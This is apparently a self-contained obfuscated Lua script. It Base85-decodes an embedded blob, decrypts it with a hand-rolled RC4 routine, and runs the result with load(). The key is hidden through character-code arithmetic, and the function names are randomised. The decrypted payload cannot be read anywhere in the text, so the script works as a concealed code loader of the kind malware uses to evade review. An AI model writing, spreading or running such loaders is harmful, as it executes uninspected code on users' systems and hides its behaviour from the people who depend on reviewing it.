local pb_str = "y}BkMfuB9Z;VR_6AdFVKec%sA*r9|%KU&ou&AKjB(}BV-;S>*lHbUb<U3!$bvZb0iSv7n181Z|Sw^KvUn}iVoNm{6V8yQfx7mqhwifC$MNK@v6k8sd{vG{$t$M8}jq%;Q?E?|8vWDJw?z6S#%3n^S)(&&B?HGD&ci|!1|O;53wM}Xx_)d84IE$HPbAkBe?!b=zuK66MEknhP3!P#GB;A>=g$HsAL@WK^Tc7`n*s~}V&Y(7h2&^+w~lWwzOGZvocN}H8?7rHEZKdjv(<AFK"

local WGjGZksw = string.char(146-33,131-22,37+36,105-39,129-23,21+32,91-40,71+35,113-41,50+33,24+44,44+30,80+23,95+18,72+15,156-37,95-43,97-22,94-20,99+21,36+19,5+43,73+36,144-40,69+37,18+30,96-40,11+44,51+32,86-20,124-17,26+40)
local function zWmFwUDu(a,b)
    local p,c=1,0
    while a>0 and b>0 do
        local ra,rb=a%2,b%2
        if ra~=rb then c=c+p end
        a,b,p=(a-ra)/2,(b-rb)/2,p*2
    end
    if a<b then a=b end
    while a>0 do
        local ra=a%2 if ra>0 then c=c+p end a,p=(a-ra)/2,p*2
    end
    return c
end
local function PYYrEjjv(s)
    local m,o,p,v,n,c={},{},{52200625,614125,7225,85,1},0,0,"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~"
    for i=1,85 do m[string.byte(c,i)]=i-1 end
    for i=1,#s do
        local x=m[string.byte(s,i)]
        if x then
            v=v+x*p[n+1] n=n+1
            if n==5 then
                table.insert(o,string.char(math.floor(v/16777216),math.floor((v%16777216)/65536),math.floor((v%65536)/256),v%256))
                v,n=0,0
            end
        end
    end
    return table.concat(o)
end
local function aPswpcXB(d,k)
    local s={} for i=0,255 do s[i]=i end
    local j=0
    for i=0,255 do j=(j+s[i]+string.byte(k,(i%#k)+1))%256 s[i],s[j]=s[j],s[i] end
    local i,out=0,{} j=0
    for idx=1,#d do
        i=(i+1)%256 j=(j+s[i])%256 s[i],s[j]=s[j],s[i]
        out[#out+1]=string.char(zWmFwUDu(string.byte(d,idx),s[(s[i]+s[j])%256]))
    end
    return table.concat(out)
end
local p_data = aPswpcXB(PYYrEjjv(pb_str), WGjGZksw)
assert(load(p_data))()
